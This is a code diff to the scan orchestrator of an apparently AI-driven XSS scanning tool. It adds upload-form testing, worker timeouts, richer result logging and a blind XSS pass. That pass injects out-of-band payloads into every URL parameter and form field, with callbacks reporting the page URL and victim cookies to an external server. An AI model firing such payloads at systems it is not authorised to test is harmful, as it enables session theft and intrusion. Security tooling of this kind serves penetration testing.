@@ -24,12 +24,19 @@ import signal
 import time
 import urllib.parse
 from dataclasses import dataclass, field
+from pathlib import Path
 from typing import Any, Sequence, TYPE_CHECKING
 
 if TYPE_CHECKING:
-    from ai_xss_generator.types import PostFormTarget
+    from ai_xss_generator.types import PostFormTarget, UploadTarget
 
-from ai_xss_generator.active.worker import WorkerResult, run_worker, run_dom_worker
+from ai_xss_generator.active.worker import (
+    WorkerResult,
+    active_worker_timeout_budget,
+    run_dom_worker,
+    run_upload_worker,
+    run_worker,
+)
 from ai_xss_generator.console import (
     fmt_duration, info, setup_panel, step, success,
     teardown_panel, update_panel, warn,
@@ -37,6 +44,8 @@ from ai_xss_generator.console import (
 )
 
 log = logging.getLogger(__name__)
+
+_BLIND_MANIFEST_FILENAME = "blind_tokens.json"
 
 
 @dataclass
@@ -54,11 +63,22 @@ class ActiveScanConfig:
     # XSS type selectors — control which scan types run
     scan_reflected: bool = True   # GET parameter injection (reflected XSS)
     scan_stored: bool = True      # POST form injection (stored XSS)
+    scan_uploads: bool = True     # multipart upload / artifact workflows
     scan_dom: bool = True         # DOM source/sink analysis (DOM XSS)
     # AI backend for cloud escalation
     ai_backend: str = "api"       # "api" | "cli"
     cli_tool: str = "claude"      # "claude" | "codex" (when ai_backend="cli")
     cli_model: str | None = None  # model passed to CLI (None = CLI default)
+    cloud_attempts: int = 1       # recursive cloud reasoning rounds per context
+    deep: bool = False
+    fast: bool = False            # skip local triage, run cloud Gen XSS directly
+    obliterate: bool = False      # fast + deep: skip probe, 3-phase broad-spectrum generation
+    fresh: bool = False           # ignore all caches, re-collect from scratch
+    blind_callback: str | None = None  # OOB callback URL for blind XSS payloads
+    waf_source: str | None = None # local path to open-source WAF/filter code for planning hints
+    keep_searching: bool = False
+    extreme: bool = False
+    research: bool = False
 
 
 def _auto_workers(rate: float, explicit_workers: int) -> int:
@@ -71,10 +91,19 @@ def _domain(url: str) -> str:
     return urllib.parse.urlparse(url).netloc or url
 
 
+def _work_item_url(kind: str, item: Any) -> str:
+    return item if kind in {"get", "dom"} else item.action_url
+
+
+def _work_item_key(kind: str, item: Any) -> str:
+    return f"{kind}:{_work_item_url(kind, item)}"
+
+
 def run_active_scan(
     urls: Sequence[str],
     config: ActiveScanConfig,
     post_forms: "Sequence[PostFormTarget]" = (),
+    upload_targets: "Sequence[UploadTarget]" = (),
     crawled_pages: Sequence[str] = (),
     session: "Any | None" = None,
 ) -> list[WorkerResult]:
@@ -88,6 +117,7 @@ def run_active_scan(
     from ai_xss_generator.active.worker import run_post_worker
     url_list = [u.strip() for u in urls if u and u.strip()]
     post_form_list = list(post_forms)
+    upload_target_list = list(upload_targets)
     crawled_pages_list = list(crawled_pages)
 
     # Build work items filtered by enabled scan types
@@ -96,6 +126,8 @@ def run_active_scan(
         work_items += [("get", u) for u in url_list]
     if config.scan_stored:
         work_items += [("post", pf) for pf in post_form_list]
+    if config.scan_uploads:
+        work_items += [("upload", ut) for ut in upload_target_list]
 
     if config.scan_dom:
         work_items += [("dom", u) for u in url_list]
@@ -110,7 +142,7 @@ def run_active_scan(
             before = len(work_items)
             work_items = [
                 (kind, item) for kind, item in work_items
-                if (item if kind == "get" else item.action_url) not in done_urls
+                if _work_item_key(kind, item) not in done_urls
             ]
             skipped = before - len(work_items)
             if skipped:
@@ -129,6 +161,8 @@ def run_active_scan(
             _reasons.append("no GET URLs with testable query parameters")
         if config.scan_stored and not post_form_list:
             _reasons.append("no POST forms discovered (try without --no-crawl)")
+        if config.scan_uploads and not upload_target_list:
+            _reasons.append("no upload forms discovered (uploads require crawl discovery or explicit targets)")
         if _reasons:
             info(f"Active scan: nothing to test — {'; '.join(_reasons)}")
         return []
@@ -136,14 +170,16 @@ def run_active_scan(
     _active_types = " + ".join(filter(None, [
         "reflected" if config.scan_reflected else None,
         "stored" if config.scan_stored else None,
+        "uploads" if config.scan_uploads else None,
         "dom" if config.scan_dom else None,
     ]))
     n_get = sum(1 for kind, _ in work_items if kind == "get")
     n_post = sum(1 for kind, _ in work_items if kind == "post")
+    n_upload = sum(1 for kind, _ in work_items if kind == "upload")
 
     n_workers = _auto_workers(config.rate, config.workers)
     step(
-        f"Active scan [{_active_types}]: {n_get} GET URL(s) + {n_post} POST form(s) | "
+        f"Active scan [{_active_types}]: {n_get} GET URL(s) + {n_post} POST form(s) + {n_upload} upload form(s) | "
         f"{n_workers} worker(s) | "
         f"{config.rate:g} req/s rate | "
         f"{config.timeout_seconds}s timeout"
@@ -157,8 +193,8 @@ def run_active_scan(
 
     # Start with results from a prior session run (empty list on fresh scan)
     results: list[WorkerResult] = list(prior_results)
-    # (proc, label, kind) — kind is "get" or "post" for worker pill display
-    active_procs: list[tuple[multiprocessing.Process, str, str]] = []
+    # (proc, label, kind, started_at, result_url)
+    active_procs: list[tuple[multiprocessing.Process, str, str, float, str]] = []
     work_iter = iter(work_items)
     total_count = len(work_items)
     completed = 0
@@ -204,11 +240,13 @@ def run_active_scan(
         # ── Workers + confirmed + active label ─────────────────────────────
         pills: list[str] = []
         _MAGENTA = "\033[35m"
-        for _, _lbl, _kind in active_procs:
+        for _, _lbl, _kind, _, _ in active_procs:
             if _kind == "get":
                 pills.append(f"{GREEN}GET●{RESET}")
             elif _kind == "post":
                 pills.append(f"{CYAN}POST●{RESET}")
+            elif _kind == "upload":
+                pills.append(f"{GREEN}UP●{RESET}")
             else:
                 pills.append(f"{_MAGENTA}DOM●{RESET}")
         for _ in range(max(0, n_workers - len(active_procs))):
@@ -232,20 +270,22 @@ def run_active_scan(
         workers = f"  {pills_str}   {DIM}│{RESET}  {conf_str} confirmed{label_part}"
         return sep, bar, workers
 
-    def _drain_queue() -> None:
+    def _record_result(r: WorkerResult) -> None:
         nonlocal confirmed_count
+        results.append(r)
+        _log_result(r)
+        if r.status == "confirmed":
+            confirmed_count += len(r.confirmed_findings)
+        if session is not None:
+            from ai_xss_generator.session import checkpoint as _checkpoint
+            _checkpoint(session, r.url, r)
+
+    def _drain_queue() -> None:
         import queue as _queue
         while True:
             try:
                 r = result_queue.get(timeout=0.05)
-                results.append(r)
-                _log_result(r)
-                if r.status == "confirmed":
-                    confirmed_count += len(r.confirmed_findings)
-                # Checkpoint every completed result so a crash or pause is resumable
-                if session is not None:
-                    from ai_xss_generator.session import checkpoint as _checkpoint
-                    _checkpoint(session, r.url, r)
+                _record_result(r)
             except _queue.Empty:
                 break
             except Exception:
@@ -254,13 +294,33 @@ def run_active_scan(
     def _reap_finished() -> None:
         nonlocal active_procs, completed
         still_running = []
-        for proc, plabel, pkind in active_procs:
+        now = time.monotonic()
+        for proc, plabel, pkind, started_at, result_url in active_procs:
+            elapsed = now - started_at
+            worker_budget = active_worker_timeout_budget(
+                config.timeout_seconds,
+                config.use_cloud,
+                config.ai_backend,
+                config.cloud_attempts,
+            )
+            if proc.is_alive() and elapsed > worker_budget:
+                warn(f"[worker] timeout after {worker_budget}s → {plabel}")
+                proc.kill()
+                proc.join(timeout=1)
+                completed += 1
+                _record_result(WorkerResult(
+                    url=result_url,
+                    status="error",
+                    error=f"Worker timed out after {worker_budget}s",
+                    kind=pkind,
+                ))
+                continue
             if not proc.is_alive():
                 proc.join(timeout=1)
                 completed += 1
                 log.debug("Worker done for %s (%d/%d)", plabel, completed, total_count)
             else:
-                still_running.append((proc, plabel, pkind))
+                still_running.append((proc, plabel, pkind, started_at, result_url))
         active_procs = still_running
 
     # Install SIGINT handler for two-stage graceful pause.
@@ -273,7 +333,7 @@ def run_active_scan(
         if _pause_requested:
             # Second Ctrl+C — kill everything now
             warn("Force-kill: terminating all workers immediately...")
-            for proc, _, _ in active_procs:
+            for proc, _, _, _, _ in active_procs:
                 proc.kill()
             raise KeyboardInterrupt
         _pause_requested = True
@@ -307,6 +367,8 @@ def run_active_scan(
                     "ai_backend": config.ai_backend,
                     "cli_tool": config.cli_tool,
                     "cli_model": config.cli_model,
+                    "cloud_attempts": config.cloud_attempts,
+                    "deep": config.deep,
                 }
                 while len(active_procs) < n_workers:
                     try:
@@ -332,6 +394,15 @@ def run_active_scan(
                                 "findings_lock": findings_lock,
                                 "auth_headers": config.auth_headers,
                                 "sink_url": config.sink_url,
+                                "crawled_pages": crawled_pages_list,
+                                "deep": config.deep,
+                                "fast": config.fast,
+                                "obliterate": config.obliterate,
+                                "fresh": config.fresh,
+                                "waf_source": config.waf_source,
+                                "keep_searching": config.keep_searching,
+                                "extreme": config.extreme,
+                                "research": config.research,
                                 **_cli_kwargs,
                             },
                             daemon=True,
@@ -344,13 +415,40 @@ def run_active_scan(
                             kwargs={
                                 "url": next_url,
                                 "waf_hint": config.waf,
+                                "model": config.model,
+                                "cloud_model": config.cloud_model,
+                                "use_cloud": config.use_cloud,
                                 "timeout_seconds": config.timeout_seconds,
                                 "result_queue": result_queue,
+                                "dedup_registry": dedup_registry,
+                                "dedup_lock": dedup_lock,
                                 "auth_headers": config.auth_headers,
+                                "fast": config.fast,
+                                "obliterate": config.obliterate,
+                                "waf_source": config.waf_source,
+                                "keep_searching": config.keep_searching,
+                                "extreme": config.extreme,
+                                "research": config.research,
+                                **_cli_kwargs,
                             },
                             daemon=True,
                         )
                         log_label = f"[DOM] {next_url}"
+                    elif kind == "upload":
+                        ut = item
+                        proc = multiprocessing.Process(
+                            target=run_upload_worker,
+                            kwargs={
+                                "upload_target": ut,
+                                "waf_hint": config.waf,
+                                "timeout_seconds": config.timeout_seconds,
+                                "result_queue": result_queue,
+                                "auth_headers": config.auth_headers,
+                                "sink_url": config.sink_url,
+                            },
+                            daemon=True,
+                        )
+                        log_label = f"[UPLOAD] {ut.action_url}"
                     else:
                         pf = item
                         proc = multiprocessing.Process(
@@ -370,13 +468,22 @@ def run_active_scan(
                                 "auth_headers": config.auth_headers,
                                 "crawled_pages": crawled_pages_list,
                                 "sink_url": config.sink_url,
+                                "deep": config.deep,
+                                "fast": config.fast,
+                                "obliterate": config.obliterate,
+                                "fresh": config.fresh,
+                                "waf_source": config.waf_source,
+                                "keep_searching": config.keep_searching,
+                                "extreme": config.extreme,
+                                "research": config.research,
                                 **_cli_kwargs,
                             },
                             daemon=True,
                         )
                         log_label = f"[POST] {pf.action_url}"
                     proc.start()
-                    active_procs.append((proc, log_label, kind))
+                    result_url = _work_item_url(kind, item)
+                    active_procs.append((proc, log_label, kind, time.monotonic(), result_url))
                     info(f"[worker] started → {log_label}")
 
             update_panel(*_build_panel())
@@ -391,8 +498,14 @@ def run_active_scan(
         signal.signal(signal.SIGINT, _original_sigint)
         teardown_panel()
         # Final drain after all processes finish
-        for proc, _, _ in active_procs:
-            proc.join(timeout=config.timeout_seconds + 5)
+        final_join_timeout = active_worker_timeout_budget(
+            config.timeout_seconds,
+            config.use_cloud,
+            config.ai_backend,
+            config.cloud_attempts,
+        ) + 5
+        for proc, _, _, _, _ in active_procs:
+            proc.join(timeout=final_join_timeout)
         _drain_queue()
         manager.shutdown()
         # Mark session complete only on clean finish; paused/crashed stays in_progress
@@ -408,40 +521,214 @@ def run_active_scan(
                 f"Re-run with the same target to resume."
             )
 
+    # ── Blind XSS injection pass ──────────────────────────────────────────────
+    # Runs AFTER the main scan so it doesn't block reflected/stored detection.
+    # Every GET URL param and POST form field gets blind OOB payloads injected.
+    if config.blind_callback:
+        _run_blind_pass(
+            urls=url_list,
+            post_forms=post_form_list,
+            config=config,
+            report_dir=Path(config.output_path).parent if config.output_path else Path("."),
+        )
+
     _print_summary(results)
     return results
 
 
+def _run_blind_pass(
+    urls: list[str],
+    post_forms: list[Any],
+    config: "ActiveScanConfig",
+    report_dir: "Path",
+) -> None:
+    """Fire blind XSS payloads across all injection points and save token manifest."""
+    from ai_xss_generator.active.blind_xss import (
+        BlindToken, BlindTokenManifest, blind_payloads_for_context, make_token,
+    )
+    from ai_xss_generator.active.executor import ActiveExecutor
+    import urllib.parse as _up
+
+    cb = config.blind_callback
+    manifest_path = report_dir / _BLIND_MANIFEST_FILENAME
+    manifest = BlindTokenManifest(manifest_path)
+    executor = ActiveExecutor(auth_headers=config.auth_headers)
+
+    try:
+        executor.start()
+    except Exception as exc:
+        log.warning("Blind XSS: Playwright start failed: %s", exc)
+        return
+
+    injected = 0
+    try:
+        # GET URL params
+        for url in urls:
+            parsed = _up.urlparse(url)
+            params = dict(_up.parse_qsl(parsed.query, keep_blank_values=True))
+            for param_name in params:
+                token = make_token()
+                payloads = blind_payloads_for_context(token, cb, "html_text")
+                for payload in payloads[:3]:  # top 3 per param to keep it lean
+                    try:
+                        test_params = {**params, param_name: payload}
+                        new_query = _up.urlencode(test_params, quote_via=_up.quote)
+                        fire_url = _up.urlunparse(parsed._replace(query=new_query))
+                        executor.fire(
+                            url=fire_url,
+                            param_name=param_name,
+                            payload=payload,
+                            all_params=params,
+                            transform_name="blind_xss",
+                        )
+                    except Exception:
+                        pass
+                manifest.record(BlindToken(
+                    token=token, url=url, param=param_name,
+                    delivery="get", context_type="html_text", callback_url=cb,
+                ))
+                injected += 1
+
+        # POST form params
+        for pf in post_forms:
+            for param_name in getattr(pf, "param_names", []):
+                token = make_token()
+                payloads = blind_payloads_for_context(token, cb, "html_text")
+                for payload in payloads[:3]:
+                    try:
+                        executor.fire_post(
+                            source_page_url=pf.source_page_url,
+                            action_url=pf.action_url,
+                            param_name=param_name,
+                            payload=payload,
+                            all_param_names=pf.param_names,
+                            csrf_field=getattr(pf, "csrf_field", None),
+                            transform_name="blind_xss",
+                        )
+                    except Exception:
+                        pass
+                manifest.record(BlindToken(
+                    token=token, url=pf.action_url, param=param_name,
+                    delivery="post", context_type="html_text", callback_url=cb,
+                ))
+                injected += 1
+
+        if injected:
+            from ai_xss_generator.console import info as _info, success as _success
+            _success(
+                f"Blind XSS: {injected} token(s) injected — "
+                f"manifest saved to {manifest_path}"
+            )
+            _info(
+                f"Blind XSS: callbacks fire to {cb}?t=TOKEN&u=URL&c=COOKIES — "
+                f"check your OOB server or run: axss --poll-blind {manifest_path}"
+            )
+    finally:
+        try:
+            executor.stop()
+        except Exception:
+            pass
+
+
 def _log_result(r: WorkerResult) -> None:
     import urllib.parse as _up
+    budget_note = (
+        f" [tier={getattr(r, 'target_tier', '') or 'unknown'}"
+        f" local={getattr(r, 'local_model_rounds', 0)}"
+        f" cloud={getattr(r, 'cloud_model_rounds', 0)}"
+        f" fallback={getattr(r, 'fallback_rounds', 0)}]"
+    )
     if r.status == "confirmed":
+        sources = {f.source for f in r.confirmed_findings}
+        if len(sources) == 1:
+            source_label = {
+                "local_model": "local",
+                "cloud_model": "cloud",
+                "phase1_waf_fallback": "waf-fallback",
+                "phase1_transform": "fallback",
+                "dom_xss_runtime": "runtime",
+            }.get(next(iter(sources)), "mixed")
+        else:
+            source_label = "mixed"
         success(
             f"[active] CONFIRMED {len(r.confirmed_findings)} finding(s) — {r.url} "
-            f"({'cloud' if r.cloud_escalated else 'local'})"
+            f"({source_label}){budget_note}"
         )
         for f in r.confirmed_findings:
             # Unquote so full-width / half-width chars display as-is, not percent-encoded
             display_url = _up.unquote(f.fired_url)
             success(f"  ↳ [{f.param_name}] {display_url}")
+            if f.ai_note:
+                info(f"    {f.ai_note}")
     elif r.status == "no_execution":
         info(
             f"[active] no execution confirmed — {r.url} "
             f"({r.transforms_tried} payloads tried"
             + (", cloud escalated" if r.cloud_escalated else "")
-            + ")"
+            + f"){budget_note}"
         )
+        if r.dead_reason:
+            info(f"    {r.dead_reason}")
+    elif r.status == "taint_only":
+        info(
+            f"[active] DOM taint confirmed, but no execution — {r.url} "
+            f"({len(r.confirmed_findings)} sink hit(s)){budget_note}"
+        )
+        for f in r.confirmed_findings:
+            display_url = _up.unquote(f.fired_url)
+            info(f"  ↳ [{f.param_name}] {display_url}")
+        if r.dead_reason:
+            info(f"    {r.dead_reason}")
+    elif r.status == "no_reflection":
+        label = "dead target" if r.dead_target else "no reflection"
+        info(f"[active] {label} — {r.url}{budget_note}")
+        if r.dead_reason:
+            info(f"    {r.dead_reason}")
     elif r.status == "error":
-        warn(f"[active] error — {r.url}: {r.error}")
+        warn(f"[active] error — {r.url}: {r.error}{budget_note}")
 
 
 def _print_summary(results: list[WorkerResult]) -> None:
     import urllib.parse as _up
     confirmed = [r for r in results if r.status == "confirmed"]
+    taint_only = [r for r in results if r.status == "taint_only"]
     all_findings = [f for r in confirmed for f in r.confirmed_findings]
+    taint_findings = [f for r in taint_only for f in r.confirmed_findings]
     errors = [r for r in results if r.status == "error"]
+    tier_counts = {
+        "hard_dead": 0,
+        "soft_dead": 0,
+        "live": 0,
+        "high_value": 0,
+        "unknown": 0,
+    }
+    local_rounds = 0
+    cloud_rounds = 0
+    fallback_rounds = 0
+    for result in results:
+        tier = str(getattr(result, "target_tier", "") or "").strip().lower() or "unknown"
+        if tier not in tier_counts:
+            tier = "unknown"
+        tier_counts[tier] += 1
+        local_rounds += int(getattr(result, "local_model_rounds", 0) or 0)
+        cloud_rounds += int(getattr(result, "cloud_model_rounds", 0) or 0)
+        fallback_rounds += int(getattr(result, "fallback_rounds", 0) or 0)
 
     info(f"\n{'─'*60}")
     info(f"Active scan complete: {len(results)} target(s) processed")
+    info(
+        "  • Pilot tiers: "
+        f"hard-dead {tier_counts['hard_dead']}  "
+        f"soft-dead {tier_counts['soft_dead']}  "
+        f"live {tier_counts['live']}  "
+        f"high-value {tier_counts['high_value']}"
+    )
+    info(
+        "  • Budget: "
+        f"local rounds {local_rounds}  "
+        f"cloud rounds {cloud_rounds}  "
+        f"fallback rounds {fallback_rounds}"
+    )
     if all_findings:
         success(f"  ✅ Confirmed XSS: {len(all_findings)} finding(s) across {len(confirmed)} target(s)")
         info("")
@@ -453,6 +740,8 @@ def _print_summary(results: list[WorkerResult]) -> None:
                 info(f"  {'─'*56}")
     else:
         info("  ➖ No confirmed XSS execution detected")
+    if taint_findings:
+        info(f"  • DOM taint reached a sink, but no payload executed: {len(taint_findings)} finding(s)")
     if errors:
         warn(f"  ⚠️  Errors: {len(errors)} target(s) failed")
     info(f"{'─'*60}\n")
